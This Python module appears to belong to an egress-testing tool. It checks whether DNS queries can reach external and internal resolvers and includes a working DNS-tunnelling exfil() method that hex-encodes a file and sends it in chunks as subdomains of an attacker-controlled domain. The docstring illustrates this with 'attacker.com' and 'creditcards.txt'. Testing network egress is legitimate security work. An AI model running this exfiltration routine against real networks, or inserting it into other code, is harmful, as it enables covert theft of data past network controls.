import binascii
from ipaddress import ip_address
import traceback
from collections import namedtuple

import dns
import dns.resolver
import dns.exception

from egress0r.payload import DNSExfilPayload
from egress0r.utils import print_fail, print_success, is_ipv4_addr, is_ipv6_addr
from egress0r.message import NegativeMessage, PositiveMessage, UnknownMessage


QueryStatus = namedtuple('QueryStatus', [
    'query',
    'dns_server',
    'answer',
    'is_expected_answer',
    'status',
    'is_internal_dns'
])

class Query:

    def __init__(self, record=None, record_type=None, expected_answers=None):
        self.record = record
        self.record_type = record_type
        self.expected_answers = expected_answers or []

    def extract_answer(self, answer):
        """Extract the answer of a resolved dns query."""
        assert isinstance(answer, dns.resolver.Answer)
        if self.record_type in ('A', 'AAAA', dns.rdatatype.A, dns.rdatatype.AAAA):
            return {a.address for a in answer}
        if self.record_type in ('TXT', dns.rdatatype.TXT):
            return {str(a).strip('"') for a in answer}
        if self.record_type in ('MX', dns.rdatatype.MX):
            return {str(a).split(' ')[1].rstrip('.') for a in answer}
        if self.record_type in ('CNAME', dns.rdatatype.CNAME):
            return {str(a).rstrip('.') for a in answer}
        return None

    def answer_is_expected(self, answer):
        """Check if the resolved query returned expected results."""
        expected_set = set(self.expected_answers)
        if isinstance(answer, dns.resolver.Answer):
            return any(self.extract_answer(answer) & expected_set)
        if isinstance(answer, str):
            return answer in expected_set
        return False


class DNSCheck:
    """Perform DNS related checks."""

    DEFAULT_TIMEOUT = 5
    START_MESSAGE = 'Performing DNS checks...'

    def __init__(self, dns_servers, queries, timeout=DEFAULT_TIMEOUT,
                 with_ipv4=True, with_ipv6=True, exfil_payload=None):
        self.with_ipv4 = with_ipv4
        self.with_ipv6 = with_ipv6
        self.queries = queries
        self.timeout = timeout
        self.external_dns_servers = self._filter_nameservers(dns_servers)
        self.internal_dns_servers = self._filter_nameservers(self.read_internal_nameservers())
        self.exfil_payload = exfil_payload

    def _setup_resolver(self, timeout, nameservers=None):
        """Configure a new resolver with the given timeout and nameservers."""
        resolver = dns.resolver.Resolver(configure=False)
        resolver.timeout = timeout
        resolver.lifetime = timeout
        resolver.nameservers = nameservers or []
        return resolver

    def read_internal_nameservers(self):
        """Read locally configured nameservers from /etc/resolv.conf."""
        ns = set()
        with open('/etc/resolv.conf') as fin:
            for line in fin.readlines():
                if line.startswith('nameserver '):
                    try:
                        ns.add(str(ip_address(line.split('nameserver ')[1].strip())))
                    except(IndexError, ValueError):
                        pass
        return tuple(ns)

    def perform_queries(self, queries, nameservers, is_internal_dns=False):
        """Perform all queries against the given nameservers.

        Arguments:
            queries - list of Query objects to resolve.
            nameservers - list of DNS server IPs (IPv4 or IPv6)
            is_internal_dns - bool indicating if the nameservers used to
                              resolve are domains coming from /etc/resolv.conf
        """
        resolver = self._setup_resolver(self.timeout)
        for query in queries:
            for dns_server in nameservers:
                resolver.nameservers = [dns_server]
                answer = None
                status = False
                was_expected = None
                try:
                    answer = resolver.query(query.record, query.record_type)
                    status = True
                    if any(query.expected_answers):
                        was_expected = query.answer_is_expected(answer)
                except dns.exception.DNSException:
                    pass

                yield QueryStatus(query, dns_server, answer, was_expected, status, is_internal_dns)


    def exfil(self, payload):
        """Exfiltrate the passed payload.

        The payload content is hex encoded and then chunked, each chunk is then being
        queried as a subdomain of the attacker's controlled second-level domain.

        Example:

            Let's assume the payload object is populated with the following values:

                payload.domain = 'attacker.com'
                payload.filename = 'creditcards.txt'
                payload.nameserver = '1.1.1.1'
                payload.chunk_size = 30
                payload.max_chunks = 3


            Upon invoking the .exfil() method with the payload, the following
            queries are performed:

                1st query:  sof.<hex encoded filename>.attacker.com

                2nd query:  <1. hex encoded chunk>.attacker.com
                3rd query:  <2. hex encoded chunk>.attacker.com
                4th query:  <3. hex encoded chunk>.attacker.com

                5th query: eof.<hex encoded filename>.attacker.com

            The first and last query only serve as start and end of file markers in
            the attackers DNS log file. Those two queries are always performed.

            The second, third and fourth queries each contain
            payload.chunk_size, hex encoded, bytes.
        """
        resolver = self._setup_resolver(self.timeout, [payload.nameserver])
        hex_fname = binascii.hexlify(payload.filename.encode('ascii')).decode('ascii')
        try:
            resolver.query(f'sof.{hex_fname}.{payload.domain}', payload.record_type)
            for chunk in payload.chunk_iter():
                encoded_chunk = binascii.hexlify(chunk).decode('ascii')
                resolver.query(f'{encoded_chunk}.{payload.domain}', payload.record_type)
            resolver.query(f'eof.{hex_fname}.{payload.domain}', payload.record_type)
            return True
        except dns.exception.DNSException:
            #traceback.print_exc()
            pass
        return False

    def _filter_nameservers(self, nameservers):
        """Remove nameservers which we can't use due to our IPv4 or IPv6 configuration."""
        filtered_servers = list(nameservers)
        for ns in nameservers:
            if is_ipv4_addr(ns) and self.with_ipv4 is False:
                filtered_servers.remove(ns)
            elif is_ipv6_addr(ns) and self.with_ipv6 is False:
                filtered_servers.remove(ns)
        return filtered_servers

    def _query_status_to_message(self, qs, is_internal_dns=False):
        """Convert QueryStatus objects to Messages."""
        internal_or_external = 'external'
        if is_internal_dns:
            internal_or_external = 'internal'
        success_msg = (f'Resolved {qs.query.record_type} {qs.query.record} with '
                       f'{internal_or_external} DNS {qs.dns_server}')
        unknown_msg = success_msg + ' - BUT the response was not expected'
        fail_msg = (f'Failed to resolve {qs.query.record_type} {qs.query.record} '
                    f'with {internal_or_external} DNS {qs.dns_server}')
        if qs.status and qs.is_expected_answer is False:
            return UnknownMessage(message=unknown_msg)
        if qs.status:
            return PositiveMessage(message=success_msg)
        return NegativeMessage(message=fail_msg)

    def check(self):
        """Perform all configured tests."""
        int_or_ext = (False, True)
        ns_tuple = (self.external_dns_servers, self.internal_dns_servers)
        for is_internal, nameservers in zip(int_or_ext, ns_tuple):
            response_iter = self.perform_queries(
                self.queries,
                nameservers,
                is_internal_dns=is_internal)
            for query_status in response_iter:
                yield self._query_status_to_message(query_status, is_internal)

        if isinstance(self.exfil_payload, DNSExfilPayload):
            exfil_success = self.exfil(self.exfil_payload)
            if exfil_success:
                yield PositiveMessage(f'Exfiltrated {self.exfil_payload.chunks_total_length} bytes of data to {self.exfil_payload.domain}')
            else:
                yield NegativeMessage('Failed to exfiltrate data')
